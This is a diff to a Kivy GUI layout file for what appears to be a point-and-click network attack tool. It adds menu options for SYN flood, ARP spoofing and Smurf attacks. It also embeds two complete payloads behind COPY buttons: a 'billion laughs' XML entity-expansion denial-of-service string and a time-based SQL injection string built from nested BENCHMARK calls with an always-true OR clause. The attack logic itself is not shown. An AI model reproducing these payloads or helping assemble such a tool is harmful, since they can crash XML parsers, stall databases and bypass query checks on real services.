@@ -25,12 +25,12 @@
     Button:
         size_hint: 0.2, 0.2
         pos_hint: {"x":0.2875, "top":0.70}
-        text: "App2"
+        text: "XXE"
         on_press: root.CickedTwo()
     Button:
         size_hint: 0.2, 0.2
         pos_hint: {"x":0.525, "top":0.70}
-        text: "App3"
+        text: "SQLI"
         on_press: root.CickedThree()
     Button:
         size_hint: 0.2, 0.2
@@ -59,48 +59,28 @@
         text: "Scan"
         on_press: root.ClickedConf1()
     Label:
-        id: port_label
-        text: "[b]PORT:[/b]"
-        size_hint: (0.7, 0.15)
-        markup: True
-        pos_hint: {"x":0.0, "top":.70}
-    Spinner:
-        id: spinner_id_port
-        on_text: root.spinner_clicked_port(spinner_id_port.text)
-        text: "None"
-        values: []
-        size_hint: 0.7, 0.15
-        pos_hint: {"x":0.0, "top":.55}
-    Button:
-        id: scan_button_port
-        size_hint: 0.3, 0.15
-        pos_hint: {"x":0.7, "top":.55}
-        text: "Scan"
-        disabled: True 
-        on_press: root.ClickedConf1_port()
-    Label:
         id: Attack_label
         text: "[b]Attack:[/b]"
         size_hint: (0.7, 0.15)
         markup: True
-        pos_hint: {"x":0.0, "top":.40}
+        pos_hint: {"x":0.0, "top":.70}
     Spinner:
         id: spinner_id_atk
         on_text: root.spinner_clicked_atk(spinner_id_atk.text)
-        text: "None"
-        values: []
+        text: "SYN flood"
+        values: ["SYN flood", "ARP spoof", "Smurf" ]
         size_hint: 0.7, 0.15
-        pos_hint: {"x":0.0, "top":.25}
+        pos_hint: {"x":0.0, "top":.55}
     Button:
-        id: scan_button_atk
+        id: button_atk
         size_hint: 0.3, 0.15
-        pos_hint: {"x":0.7, "top":.25}
+        pos_hint: {"x":0.7, "top":.55}
         disabled: True 
         text: "Attack"
         on_press: root.ClickedConf1_atk()
     Label:
         id: Satus_label
-        text: "[b]Status: IDLE[/b]"
+        text: "[b]Attack status: IDLE[/b]"
         size_hint: (0.7, 0.15)
         markup: True
         pos_hint: {"x":0.0, "top":.10}
@@ -108,25 +88,30 @@
 
 
 <P2>:
-    Label:
-        text: "App 2 conf"
-        size_hint: 0.6, 0.2
-        pos_hint: {"x":0.2, "top":0.80}
+    TextInput:
+        id: XXE_ID
+        size_hint: 0.8, 0.6
+        pos_hint: {"x":0.1, "top":0.90}
+        text:  "<!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lola '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'> <!ENTITY lolb '&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;&lola;'><!ENTITY lolc '&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;&lolb;'><!ENTITY lold '&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;&lolc;'><!ENTITY lole '&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;&lold;'><!ENTITY lolf '&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;&lole;'><!ENTITY lolg '&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;&lolf;'><!ENTITY lolh '&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;&lolg;'><!ENTITY loli '&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;&lolh;'>]><attack>&loli;</attack>"
+        disabled: True
     Button:
         size_hint: 0.2, 0.2
-        pos_hint: {"x":0.750, "top":0.70}
-        text: "Button"
+        pos_hint: {"x":0.750, "top":0.25}
+        text: "COPY"
         on_press: root.ClickedConf2()
 
 <P3>:
-    Label:
-        text: "App 3 conf"
-        size_hint: 0.6, 0.2
-        pos_hint: {"x":0.2, "top":0.80}
-    Button:
+    TextInput:
+        id: SQLI_ID
+        size_hint: 0.8, 0.6
+        pos_hint: {"x":0.1, "top":0.90}
+        text:  "' AND BENCHMARK(9999999,BENCHMARK(999999,BENCHMARK(999999,MD5(NOW()))))=0 OR '1'='1"
+        disabled: True
+    Button: 
+        id: button_copy_sqli
         size_hint: 0.2, 0.2
-        pos_hint: {"x":0.750, "top":0.70}
-        text: "Button"
+        pos_hint: {"x":0.750, "top":0.25}
+        text: "COPY"
         on_press: root.ClickedConf3()
 
 <P4>:
